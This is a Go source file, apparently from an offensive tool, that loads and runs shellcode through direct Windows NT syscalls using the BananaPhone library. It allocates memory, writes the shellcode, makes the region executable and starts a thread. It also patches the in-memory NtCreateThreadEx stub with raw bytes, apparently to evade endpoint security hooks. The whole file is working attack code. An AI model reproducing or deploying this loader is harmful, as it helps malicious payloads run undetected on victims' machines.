package core

import (
	"fmt"
  "unsafe"
  "syscall"

  // Third-party
	bap "github.com/C-Sto/BananaPhone/pkg/BananaPhone"

  // Internal
	"golang.org/x/sys/windows"
)

func CreateThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
	const (
		thisThread = uintptr(0xffffffffffffffff)
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := bap.Syscall(
		NtAllocateVirtualMemorySysid,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	bap.WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	r1, r = bap.Syscall(
		NtProtectVirtualMemorySysid,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	var hhosthread uintptr
	r1, r = bap.Syscall(
		NtCreateThreadExSysid,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		handle,
		baseA,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
}


func CreateRemoteThread(shellcode []byte) (error) {
	kernel32DLL := windows.NewLazySystemDLL("kernel32.dll")
	VirtualProtectEx := kernel32DLL.NewProc("VirtualProtectEx")

	bp, e := bap.NewBananaPhone(bap.AutoBananaPhoneMode)
	if e != nil {
		return e
	}
	
	mess, e := bp.GetFuncPtr("NtCreateThreadEx")
	if e != nil {
		return e
	}
	
	oldProtect := windows.PAGE_EXECUTE_READ
	VirtualProtectEx.Call(uintptr(0xffffffffffffffff), uintptr(mess), uintptr(0x100), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	
	bap.WriteMemory([]byte{0x90, 0x90, 0x4c, 0x8b, 0xd1, 0xb8, 0xc1, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}, uintptr(mess))
	
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		return e
	}
	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		return e
	}
	createthread, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		return e
	}

	CreateThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
	return nil
}



